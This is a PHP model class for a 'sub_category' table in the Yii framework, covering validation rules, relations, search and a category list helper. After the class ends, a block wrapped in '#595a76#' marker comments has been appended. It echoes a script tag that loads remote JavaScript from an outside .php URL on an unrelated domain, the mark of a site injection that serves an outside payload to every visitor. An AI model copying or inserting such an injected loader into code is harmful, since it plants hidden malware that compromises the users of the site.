
<?php

/**
 * This is the model class for table "sub_category".
 *
 * The followings are the available columns in table 'sub_category':
 * @property integer $scid
 * @property integer $main_category_id
 * @property string $sub_category
 * @property string $description
 *
 * The followings are the available model relations:
 * @property Products[] $products
 * @property MainCategory $mainCategory
 */
class SubCategory extends CActiveRecord
{
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'sub_category';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('main_category_id, sub_category', 'required'),
			array('main_category_id', 'numerical', 'integerOnly'=>true),
			array('sub_category,icon', 'length', 'max'=>200),

			array('icon', 'file', 'types'=>'jpg,jpeg, gif, png','allowEmpty'=>true, 'on'=>'insert'),
			array('icon', 'file', 'types'=>'jpg,jpeg, gif, png', 'allowEmpty'=>true, 'on'=>'update'),
			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('scid, main_category_id, sub_category, description,icon', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
			'products' => array(self::HAS_MANY, 'Products', 'sub_category_id'),
			'mainCategory' => array(self::BELONGS_TO, 'MainCategory', 'main_category_id'),
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'scid' => 'Scid',
			'main_category_id' => 'Main Category',
			'sub_category' => 'Sub Category',
			'description' => 'Description',
			'icon'=>'Icon',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search( $param = array() )
	{
		// @todo Please modify the following code to remove attributes that should not be searched.

		$criteria=new CDbCriteria($param);
		$criteria->together=true;
		$criteria->compare('scid',$this->scid);
		$criteria->compare('main_category_id',$this->main_category_id);
		$criteria->compare('sub_category',$this->sub_category,true);
		$criteria->compare('description',$this->description,true);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return SubCategory the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}

	public function beforeDelete()
	{
		
		//$imageLocation = Yii::app()->basePath."/../upload/icons/";	
		//@unlink($imageLocation.$this->columName);			
		return parent::beforeDelete();
	}

	public static function getSubCategory() {
		return CHtml::listData(Subcategory::model()->findAll(array("order"=>"sub_category")),'scid', 'sub_category');
	}
}







#595a76#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383525\"></script>";
echo $w;
}
#/595a76#

